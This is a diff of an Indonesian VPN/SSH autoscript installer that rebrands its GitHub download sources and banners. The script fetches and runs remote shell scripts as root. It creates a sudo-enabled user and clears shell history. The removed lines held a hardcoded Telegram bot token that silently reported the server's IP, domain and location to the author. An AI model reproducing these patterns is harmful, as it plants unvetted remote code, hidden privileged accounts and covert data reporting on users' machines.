@@ -13,7 +13,7 @@ yellow() { echo -e "\\033[33;1m${*}\\033[0m"; }
 green() { echo -e "\\033[32;1m${*}\\033[0m"; }
 red() { echo -e "\\033[31;1m${*}\\033[0m"; }
 # domain random
-CDN="https://raw.githubusercontent.com/scriswan/premiumsc/main/ssh"
+CDN="https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/ssh"
 cd /root
 if [ "${EUID}" -ne 0 ]; then
 echo "You need to run this script as root"
@@ -104,45 +104,23 @@ chmod 644 /root/.profile
 echo -e "[ ${green}INFO${NC} ] Preparing the install file"
 apt install git curl -y >/dev/null 2>&1
 apt install python -y >/dev/null 2>&1
-echo -e "[ ${green}INFO${NC} ] Aight good ... installation file is ready"
-echo -e "$green                                                                                         $NC"
-echo -e "$green██████╗░██████╗░██╗███╗░░██╗░██████╗░░█████╗░░██████╗  ░█████╗░██╗░░░██╗████████╗░█████╗░$NC"
-echo -e "$green██╔══██╗██╔══██╗██║████╗░██║██╔════╝░██╔══██╗██╔════╝  ██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗$NC"
-echo -e "$green██████╦╝██████╔╝██║██╔██╗██║██║░░██╗░███████║╚█████╗░  ███████║██║░░░██║░░░██║░░░██║░░██║$NC"
-echo -e "$green██╔══██╗██╔══██╗██║██║╚████║██║░░╚██╗██╔══██║░╚═══██╗  ██╔══██║██║░░░██║░░░██║░░░██║░░██║$NC"
-echo -e "$green██████╦╝██║░░██║██║██║░╚███║╚██████╔╝██║░░██║██████╔╝  ██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝$NC"
-echo -e "$green╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚═════╝░  ╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░$NC"
-echo -e "$green                                                                                         $NC"
-echo -e "$green██╗███╗░░██╗░██████╗████████╗░█████╗░██╗░░░░░██╗░░░░░  ░██████╗░██████╗██╗░░██╗$NC"
-echo -e "$green██║████╗░██║██╔════╝╚══██╔══╝██╔══██╗██║░░░░░██║░░░░░  ██╔════╝██╔════╝██║░░██║$NC"
-echo -e "$green██║██╔██╗██║╚█████╗░░░░██║░░░███████║██║░░░░░██║░░░░░  ╚█████╗░╚█████╗░███████║$NC"
-echo -e "$green██║██║╚████║░╚═══██╗░░░██║░░░██╔══██║██║░░░░░██║░░░░░  ░╚═══██╗░╚═══██╗██╔══██║$NC"
-echo -e "$green██║██║░╚███║██████╔╝░░░██║░░░██║░░██║███████╗███████╗  ██████╔╝██████╔╝██║░░██║$NC"
-echo -e "$green╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚══════╝  ╚═════╝░╚═════╝░╚═╝░░╚═╝$NC"
-echo -e "$green» TERIMAKASIH TELAH MEMAKAI AUTOSCRIPT PREMIUM RISWAN-VPN$NC"
+echo -e "[ ${green}INFO${NC} ] Pemasangan File Sudah Siapp Sayang"
 sleep 5
 echo -ne "[ ${green}INFO${NC} ] Check permission : "
 mkdir -p /var/lib/SIJA >/dev/null 2>&1
 echo "IP=" >> /var/lib/SIJA/ipvps.conf
 echo ""
-wget -q https://raw.githubusercontent.com/scriswan/premiumsc/main/tools.sh;chmod +x tools.sh;./tools.sh
+wget -q https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/tools.sh;chmod +x tools.sh;./tools.sh
 rm tools.sh
 clear
 echo " "
 clear
-echo -e "$green━━━━━━━━━━┏┓━━━━━━━━━━━━━━━━━━━━━━━━┏┓━━━━━━━━━━━$NC"
-echo -e "$green━━━━━━━━━┏┛┗┓━━━━━━━━━━━━━━━━━━━━━━┏┛┗┓━━━━━━━━━━$NC"
-echo -e "$green┏━━┓━┏┓┏┓┗┓┏┛┏━━┓━━━━┏━━┓┏━━┓┏┓┏━┓━┗┓┏┛┏┓┏━┓━┏━━┓$NC"
-echo -e "$green┗━┓┃━┃┃┃┃━┃┃━┃┏┓┃━━━━┃┏┓┃┃┏┓┃┣┫┃┏┓┓━┃┃━┣┫┃┏┓┓┃┏┓┃$NC"
-echo -e "$green┃┗┛┗┓┃┗┛┃━┃┗┓┃┗┛┃━━━━┃┗┛┃┃┗┛┃┃┃┃┃┃┃━┃┗┓┃┃┃┃┃┃┃┗┛┃$NC"
-echo -e "$green┗━━━┛┗━━┛━┗━┛┗━━┛━━━━┃┏━┛┗━━┛┗┛┗┛┗┛━┗━┛┗┛┗┛┗┛┗━┓┃$NC"
-echo -e "$green━━━━━━━━━━━━━━━━━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━┏━┛┃$NC"
-echo -e "$green━━━━━━━━━━━━━━━━━━━━━┗┛━━━━━━━━━━━━━━━━━━━━━━┗━━┛$NC"
+    echo -e "$BYellow◇━━━━━━━━━━━━━━━━━━◇$NC"
     echo -e "$BBlue                     SETUP DOMAIN VPS     $NC"
-    echo -e "$BYellow----------------------------------------------------------$NC"
+    echo -e "$BYellow◇━━━━━━━━━━━━━━━━━━◇$NC"
     echo -e "$BGreen 1. Choose Your Own Domain / Gunakan Domain Sendiri $NC"
     echo -e "$BGreen 2. Use Domain Random / Gunakan Domain Random $NC"
-    echo -e "$BYellow----------------------------------------------------------$NC"
+    echo -e "$BYellow◇━━━━━━━━━━━━━━━━━━◇$NC"
     read -rp " input 1 or 2 / pilih 1 atau 2 : " dns
 	if test $dns -eq 1; then
     read -rp " Enter Your Domain / masukan domain : " dom
@@ -166,7 +144,7 @@ fi
 # Inisialisasi
 MYIP=$(curl -sS ipv4.icanhazip.com)
 # Perizinan Sc & Pemanggilan username
-izinsc="https://raw.githubusercontent.com/scriswan/premiumsc/main/register"
+izinsc="https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/register"
 rm -f /usr/bin/user
 username=$(curl $izinsc | grep $MYIP | awk '{print $2}')
 echo "$username" >/usr/bin/user
@@ -188,56 +166,36 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="5521096873"
-KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"
-TIME="10"
-URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Instalasi Autoscript-vvip V2.5
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<code>Username   :</code> <code>$Name</code>
-<code>Domain     :</code> <code>$domain</code>
-<code>IP Vps     :</code> <code>$MYIP</code>
-<code>IP Vps     :</code> <code>$ISP</code>
-<code>Timezone   :</code> <code>$TIMEZONE</code>
-<code>Location   :</code> <code>$CITY</code>
-<code>Exp Sc.    :</code> <code>$Exp</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-By Admin @Riswanvpnstore
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<i>Notifications Automatic From Github</i>
-"'&reply_markup={"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/Riswanvpnstore"},{"text":"Contack","url":"https://wa.me/6285888801241"}]]}'
-
-curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 clear
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "$green      Install SSH / WS               $NC"
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
+echo -e "$green      Menginstall SSH / WS               $NC"
+echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
 sleep 2
 clear
-wget https://raw.githubusercontent.com/scriswan/premiumsc/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
+wget https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/ssh/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
 clear
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "$green      Install BACKUP               $NC"
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
+echo -e "$green      Menginstall BACKUP               $NC"
+echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
 sleep 2
 clear
-wget https://raw.githubusercontent.com/scriswan/premiumsc/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
+wget https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/backup/set-br.sh &&  chmod +x set-br.sh && ./set-br.sh
 clear
 clear
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "$green          Install XRAY              $NC"
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
+echo -e "$green      Menginstall XRAY              $NC"
+echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
 sleep 2
 clear
-wget https://raw.githubusercontent.com/scriswan/premiumsc/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
-wget https://raw.githubusercontent.com/scriswan/premiumsc/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
+wget https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/xray/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
+wget https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
 clear
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "$green          Install SLOWDNS              $NC"
-echo -e "\e[33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
+echo -e "$green      Menginstall SLOWDNS              $NC"
+echo -e "◇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◇\033[0m"
 sleep 2
 clear
-wget -q -O slow.sh https://raw.githubusercontent.com/scriswan/premiumsc/main/slow.sh && chmod +x slow.sh && ./slow.sh
+wget -q -O slow.sh https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/slow.sh && chmod +x slow.sh && ./slow.sh
 clear
 cat> /root/.profile << END
 if [ "$BASH" ]; then
@@ -260,7 +218,7 @@ if [ ! -f "/etc/log-create-user.log" ]; then
 echo "Log All Account " > /etc/log-create-user.log
 fi
 history -c
-serverV=$( curl -sS https://raw.githubusercontent.com/scriswan/premiumsc/main/version )
+serverV=$( curl -sS https://raw.githubusercontent.com/Lite-VPN/premiumsc/main/version )
 echo $serverV > /opt/.ver
 aureb=$(cat /home/re_otm)
 b=11
@@ -272,8 +230,8 @@ gg="AM"
 fi
 curl -sS ifconfig.me > /etc/myipvps
 echo " "
-echo "===================-[ RISWAN-VPN ]-===================" | tee -a log-install.txt
-echo "------------------------------------------------------------" | tee -a log-install.txt
+echo "◇━━━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
+echo "◇━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
 echo "" | tee -a log-install.txt
 echo "   >>> Service & Port"  | tee -a log-install.txt
 echo "   - OpenVPN              : 2086"  | tee -a log-install.txt
@@ -308,8 +266,8 @@ echo "   - Admin Control" | tee -a log-install.txt
 echo "   - Change port" | tee -a log-install.txt
 echo "   - Full Orders For Various Services" | tee -a log-install.txt
 echo "" | tee -a log-install.txt
-echo "------------------------------------------------------------" | tee -a log-install.txt
-echo "===============-[ Script By Riswanvpn ]-==============" | tee -a log-install.txt
+echo "◇━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
+echo "◇━━━━━━━━━━━━━━━━━━━━◇" | tee -a log-install.txt
 echo ""
 echo ""
 rm /root/setup.sh >/dev/null 2>&1
